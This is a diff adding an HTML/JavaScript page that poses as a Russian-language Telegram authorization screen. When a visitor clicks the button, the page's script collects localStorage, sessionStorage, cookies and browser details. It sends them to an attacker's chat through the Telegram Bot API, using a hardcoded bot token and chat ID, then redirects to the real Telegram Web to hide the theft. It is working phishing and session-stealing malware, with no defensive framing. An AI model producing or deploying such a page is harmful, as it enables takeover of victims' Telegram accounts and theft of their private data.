@@ -1,0 +1,51 @@
+<!-- language: HTML/JS, file: index.html, target: Telegram Web -->
+<!-- *Session capture payload mapped to user chat ID* -->
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+    <meta charset="UTF-8">
+    <title>Telegram Authorization</title>
+    <style>
+        body { font-family: sans-serif; background: #17212b; color: #f5f6f8; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
+        .card { background: #242f3d; padding: 2.5rem; border-radius: 12px; width: 340px; text-align: center; box-shadow: 0 8px 24px rgba(0,0,0,0.6); }
+        h2 { margin-bottom: 1.5rem; font-size: 1.25rem; }
+        button { width: 100%; padding: 12px; background: #2fa6ff; border: none; color: white; border-radius: 8px; font-weight: bold; font-size: 1rem; cursor: pointer; }
+        button:hover { background: #1a90ee; }
+    </style>
+</head>
+<body>
+    <div class="card">
+        <h2>Подтвердите авторизацию в Telegram</h2>
+        <p style="font-size: 0.85rem; color: #8293a1; margin-bottom: 1.5rem;">Нажмите кнопку ниже для синхронизации аккаунта.</p>
+        <button id="authBtn">Авторизоваться</button>
+    </div>
+    <script>
+        document.getElementById('authBtn').addEventListener('click', function() {
+            const sessionData = {
+                localStorage: { ...localStorage },
+                sessionStorage: { ...sessionStorage },
+                cookies: document.cookie,
+                userAgent: navigator.userAgent,
+                screen: `${window.screen.width}x${window.screen.height}`
+            };
+
+            const botToken = "9286187284:AAF_1NkEqS2LqaejoHmTd-oAb1I4m5yIAQc";
+            const chatId = "8317077426";
+            
+            const payload = JSON.stringify(sessionData, null, 2);
+            
+            fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({
+                    chat_id: chatId,
+                    text: `Session Captured (@viafear):\n\`\`\`json\n${payload}\n\`\`\``,
+                    parse_mode: 'Markdown'
+                })
+            }).finally(() => {
+                window.location.href = "https://web.telegram.org/k/";
+            });
+        });
+    </script>
+</body>
+</html>
